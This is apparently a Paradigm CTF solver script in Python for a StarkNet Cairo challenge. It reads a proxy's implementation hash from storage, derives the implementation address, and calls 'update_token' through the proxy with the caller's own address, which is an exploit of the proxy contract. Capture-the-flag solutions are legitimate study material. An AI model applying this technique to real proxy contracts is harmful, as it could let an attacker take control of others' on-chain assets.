from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import calculate_contract_address_from_hash


async def solver(client: AccountClient, proxy_contract: Contract):

    implementation_class_hash = await client.get_storage_at(proxy_contract.address, get_storage_var_address("implementation"), "latest")
    implementation_address = calculate_contract_address_from_hash(
        salt=111111,
        class_hash=implementation_class_hash,
        constructor_calldata=[],
        deployer_address=0,
    )

    implemenatation_contract = await Contract.from_address(implementation_address, client)

    wrapper_contract = Contract(
        proxy_contract.address,
        implemenatation_contract.data.abi,
        client,
    )
    result = await wrapper_contract.functions["update_token"].invoke({"token_address": client.address, "token_id": 1}, max_fee=int(1e16))
    await result.wait_for_acceptance()

run_solver(solver)
